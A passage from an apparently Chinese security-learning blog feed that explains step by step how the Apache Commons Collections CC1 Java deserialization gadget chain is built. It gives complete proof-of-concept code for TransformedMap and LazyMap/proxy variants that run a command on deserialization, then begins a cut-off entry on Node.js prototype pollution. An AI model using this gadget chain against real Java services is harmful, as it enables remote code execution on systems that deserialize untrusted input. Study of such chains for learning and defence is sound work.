src="../images/image-20230317170511870.png" alt="image-20230317170511870"></p><p><img src="../images/image-20230317165356791.png" alt="image-20230317165356791"></p><p>然后我们就跟进看一下<code>valueTransformer</code>是什么东西</p><p><img src="../images/image-20230317165605279.png" alt="image-20230317165605279"></p><p>是有一个保护的函数方法来给他赋值，那我们继续跟进，看一下咋调用这个函数方法</p><p>然后就发现这里有个decorate方法调用了这个函数方法，并且还可以传值</p><p><img src="../images/image-20230317165703877.png" alt="image-20230317165703877"></p><p>因为这个decorate里边需要传一个map类，所以我们就新建一个map类来传参。</p><p><img src="../images/image-20230317170703239.png" alt="image-20230317170703239"></p><p>这里只要写是因为checkvalue里只用到了valuetransformer,所以keytransfomer就为null.</p><p>但是这里虽然是能调用到了transfomer方法，但是checkvalue里的value不可控，所以我们就继续去找谁里面调用了checkvalue方法</p><p><img src="../images/image-20230317171128586.png" alt="image-20230317171128586"></p><p>在这里发现了一个抽象类里边的setvalue是调用这个方法的，并且我们还发现了这个抽象类是transformedMap的父类</p><p><img src="../images/image-20230317171449070.png" alt="image-20230317171449070"></p><p><img src="../images/image-20230317171308361.png" alt="image-20230317171308361"></p><p>那么我们就接着去找谁调用了setvalue方法</p><p>这里话是利用MapEntry遍历来调用setvalue方法的</p><p><img src="../images/image-20230317172617863.png" alt="image-20230317172617863"></p><p>这样写就能成功调用setvalue了</p><p>首先，这里给hashmap.put(“key”,”value”)的原因是简单创建一个key值，为了下方的遍历提供内容，不写的话就不会进行for循环里的遍历</p><p>这里是先for循环进行遍历，然后调用setvalue(这个时候的value值已经传进去了)里面的checkvalue,然后checkvalue就会根据传的valuetransformer进行调用transfomer.</p><p>然后就会弹计算器了</p><p><strong>接下来我们继续找谁调用了setvalue方法</strong></p><p>这里最好的想法是直接找谁的readobject里面调用了setvalue方法，如果没找到的话就和上面一样的方法 ，看谁里面调用了setvalue方法，最后的归宿都是找readobject里面调用了xxx方法</p><p><img src="../images/image-20230317175443088.png" alt="image-20230317175443088"></p><p><img src="../images/image-20230317175529057.png" alt="image-20230317175529057"></p><p>在这个类里边的方法找到了调用setvalue的方法</p><p><img src="../images/image-20230317175649684.png" alt="image-20230317175649684"></p><p>并且这个memberValues可控，那么我们就可以限定调用哪个类的setvalue方法了</p><p>这里有一个小问题就是这个类不是public类型，是一个default类型</p><p>那么不能直接调用了</p><p><img src="../images/image-20230317180005106.png" alt="image-20230317180005106"></p><p>必须得在这个包里才能调用了，所以这里我们就是用反射的方法进行调用了</p><p><img src="../images/image-20230317184552260.png" alt="image-20230317184552260"></p><p>反射的方法就写好了，这里为什么能传map，是因为这个setvalue所在的类是transformedMap的父类，然后传的map是TransformerMap类创建的，所以在反序列化的时候就会调用到那个抽象类里边的setvalue方法，这里写的Override的原因是因为下图的这个构造函数里边要求的注释class</p><p><img src="../images/image-20230317185333816.png" alt="image-20230317185333816"></p><p>这里有个不好的点就是value没法控制，所以得想办法来传value</p><p>还有就是这里的Runtime是没法进行序列化的(因为没有继承serializeble)</p><p><img src="../images/image-20230317194226941.png" alt="image-20230317194226941"></p><p>还有就是这里的两个if也要判断绕过</p><p><img src="../images/image-20230317194329316.png" alt="image-20230317194329316"></p><p>所以上面一共有三个问题要进行解决</p><p><strong>先解决runtime序列化问题</strong></p><p>这里的话先写出反射的方法，然后在写到<code>InvokerTransformer</code>上</p><p><img src="../images/image-20230317195857622.png" alt="image-20230317195857622"></p><p>因为class能进行序列化，而Runtime不行，所以就使用反射来写</p><p>接下来我们把这段代码与InvokerTransformer结合来写</p><p>这也是个反射方法(写在函数内部的)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230317202145679.png" alt="image-20230317202145679"></p><p><img src="../images/image-20230317202207893.png" alt="image-20230317202207893"></p><p>这段代码写的有点绕，就是利用InvokerTransformer类里边transform的反射在利用一遍，就是利用反射获取到Runtime.class的getMethod方法，然后第二位置就是传参数，第三位置就是传invoke需要的东西，就是有点嵌套的感觉，慢慢看就能把这个代码看懂了</p><p>就是根据，没用InvokerTransformer之前写的runtime反射代码来写，一步一步用InvokerTransformer来写反射来进行替换</p><p>接下来就到替换invoke了<img src="../images/image-20230317202631561.png" alt="image-20230317202631561"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(method);</span><br></pre></td></tr></table></figure><p>这个和上面的第一次解释一样，也是和嵌套一样</p><p>上面是到Runtime.getRuntime()了，那么我们接下来直接写”exec”直接反射调用弹计算器了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><p>这句代码就没那么抽象了，不像前两个那么抽象</p><p><img src="../images/image-20230317204314863.png" alt="image-20230317204314863"></p><p>这就是替换掉之前写的没加InvokerTransformer的反射调用了，然后就可以弹计算器了</p><p>这里还暴露了一个弊端就是老是嵌套用法，前一个调用后一个，老是调用tranformer里面的反射，所以这里就利用<code>ChainedTransformer</code>来解决这个问题</p><p><img src="../images/image-20230317205703565.png" alt="image-20230317205703565"></p><p>就是图片上两个函数，就是靠这两个来进行替换掉</p><p><img src="../images/image-20230317210240200.png" alt="image-20230317210240200"></p><p>然后就写好了这里就只有Runtime.class是我们可控的，其他只是起个变量名的作用而已</p><p>解决完Runtime不能反序列化后，这里就得解决那两个if判断的问题了</p><p><strong>绕过if两个判断</strong></p><p><img src="../images/image-20230317211434930.png" alt="image-20230317211434930"></p><p>这里的memberValue是传进来的map，在外面已经定义好了</p><p><img src="../images/image-20230317214237583.png" alt="image-20230317214237583"></p><p>并且已经有key值了，但是因为这里的key找的是map里的，但是找这个key值却是memberType的，就Override这个东西，这个东西是没有value()值的，所以我们就换一个注释函数</p><p><img src="../images/image-20230317214436564.png" alt="image-20230317214436564"></p><p>这个是有value()值的，名字也为value，所以我们就想着把<code>hashMap.put(&quot;key&quot;,&quot;aaa&quot;);</code>改为<code>hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</code>那么就能绕过判断了</p><p>那么接下来就剩value的值怎么进行控制了</p><p><strong>控制setvalue里的value值</strong></p><p>那么我们这里就可以利用这个<code>ConstantTransformer</code>类来进行解决这个问题</p><p><img src="../images/image-20230317215731924.png" alt="image-20230317215731924"></p><p>就是利用这一点，不管transform传啥值，最后返回的都是固定的东西，那么我们只需要控制这个固定的东西就行</p><p><img src="../images/image-20230317220314223.png" alt="image-20230317220314223"></p><p>新增加这一行就解决了这个value不能控制的问题了，就是在setvalue调用到checkvalue那边的时候，然后就会调用<code>chainedTransformer.transformer</code>方法，然后因为在数组中因为有<code>ConstantTransformer(Runtime.class)</code>存在就会调用<code>ConstantTransformer.transformer</code>,然后就会返回一个Runtime.class,那么这个value就成功可控了，接下来就是循环嵌套了，名字影响不大</p><p>这里不管<code>chainedTransformer.transformer</code>传进来什么value，<code>ConstantTransformer.transformer</code>都会固定返回Runtime.class</p><p><strong>然后就全部跟完了</strong></p><p><strong>cc1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">   <span class="comment">//     chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntime是无参函数</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="comment">////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">////        &#123;</span></span><br><span class="line"><span class="comment">////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">////        &#125;</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面写的非常详细了，有疑问的时候可以回来温习一下</p><p><strong>接下来还有个lazyMap版本</strong></p><p>我们在上面写的是<code>TransformedMap</code>版本，因为在看谁调用了transformer的时候，发现了还有lazyMap这个类，然后又巧妙的发现了这个类可以用，于是就有了这个版本</p><p><img src="../images/image-20230318103058344.png" alt="image-20230318103058344"></p><p>lazyMap的get()方法，那么我们就和上面的思路一样，找谁调用了get()方法</p><p><img src="../images/image-20230318103911715.png" alt="image-20230318103911715"></p><p>然后在这个类里边发现了get方法，并且这个memberValue可控</p><p><img src="../images/image-20230318104007111.png" alt="image-20230318104007111"></p><p>是在这个invoke方法里面</p><p>所以这里得用动态代理方法</p><p>思路就是<code>AnnotationInvocationHandler.readObject</code>里面传一个动态代理方法，然后动态代理就会使用invoke，invoke里面就会调用lazyMap.get方法(因为memberValues可控)，然后get方法里面就传一个<code>chainedTransformer</code>(get里面调用了transfom方法),然后就能弹计算器了</p><p><img src="../images/image-20230318110547425.png" alt="image-20230318110547425"></p><p>写好了，进行对这段代码进行解释一下</p><p>这里的LazyMap的decorate方法和TransformedMap.decorate方法是一个意思，这里就不多说了，下面的实例化对象使用InvocationHandler是因为readObject所在的AnnotationInvocationHandler是继承于InvocationHandler的(还有一点是不能使用这个AnnotationInvocationHandler    可以自己去idea里面试一下)  </p><p>这里传的lazyMap就是可控的memberValues,在反序列化的时候这个memberValues就会调用这个entrySet()方法，因为这个方法是无参的，能符合接下来动态代理调用的invoke方法里调用get的条件，下面那行写的<code>xProxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>方法就是为了调用invoke方法，从而调用到lazymap里的get方法，然后get的方法就会调用chainedTransformer.tranfome方法，从而实现命令执行。</p><p><img src="../images/image-20230318112157242.png" alt="image-20230318112157242"></p><p>最后再补充一点就完成了</p><p>因为我们是想在readObject里面执行，然后刚好readobject所在的这个类是接收map类的，然后动态代理的话是必须得跟一个接口的，所以就<code>Map map = (Map) Proxy.newProxyInstance(h.getClass().getClassLoader(), h.getClass().getInterfaces(),h);</code>这样来写，然后在实例化一下，把东西传进去，然后进行序列化</p><p><strong>写好的链子</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.internal.org.objectweb.asm.commons.Method;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="comment">//import java.lang.reflect.Method;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//        Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//         InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        Method method = (Method) new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null &#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(method);</span></span><br><span class="line"><span class="comment">//            new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span> &#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">                &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">         <span class="comment">//Class c = Runtime.class;</span></span><br><span class="line">          <span class="comment">//Method method =  c.getMethod(&quot;getRuntime&quot;,null);</span></span><br><span class="line">          <span class="comment">//Runtime r = (Runtime) method.invoke(null,null); //getRuntime是无参函数</span></span><br><span class="line"><span class="comment">//          Method method1 = c.getMethod(&quot;exec&quot;,String.class);</span></span><br><span class="line"><span class="comment">//          method1.invoke(r,&quot;calc&quot;);</span></span><br><span class="line"><span class="comment">//        HashMap hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        hashMap.put(&quot;value&quot;,&quot;aaa&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object,Object&gt; map = TransformedMap.decorate(hashMap,null,chainedTransformer);</span></span><br><span class="line"><span class="comment">//////        for (Map.Entry entry:map.entrySet())</span></span><br><span class="line"><span class="comment">//////        &#123;</span></span><br><span class="line"><span class="comment">//////            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//////        &#125;</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span>  <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(),h);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Override.class,map);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(o);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">            oos.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>最后的话cc1链就全部学完了，也收获了很多</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java反序列化 cc1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs-污染</title>
      <link href="/posts/1941d3ec.html"/>
      <url>/posts/1941d3ec.html</url>
      
        <content type="html"><![CDATA[<p>这里我是看p牛的文章来进行学习的，所以下面的内容也是根据p牛的文章来写一点自己的见解</p><p><img src="../images/image-20230316193813743.png" alt="image-20230316193813743"></p><p>这里p牛进行了总结，可以根据p牛写的这个代码来进行理解</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span 